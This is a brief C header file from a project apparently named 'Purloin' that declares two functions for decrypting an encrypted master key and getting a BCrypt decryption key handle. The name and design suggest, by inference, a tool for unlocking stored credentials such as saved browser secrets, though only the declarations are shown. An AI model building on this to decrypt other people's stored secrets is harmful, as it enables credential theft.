#pragma once
#include "Purloin_Utils.h"
#include "Purloin_Debug.h"

BOOL decrypt_masterkey(PWCHAR enc_master_key, PCHAR char_master_key, WORD enc_char_master_key_size, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, DWORD buf_outSize);
BOOL get_decryption_handler(BCRYPT_KEY_HANDLE* p_handle_key, DATA_BLOB* blob_dec_masterkey, PSTR buf_outMsg, DWORD buf_outSize);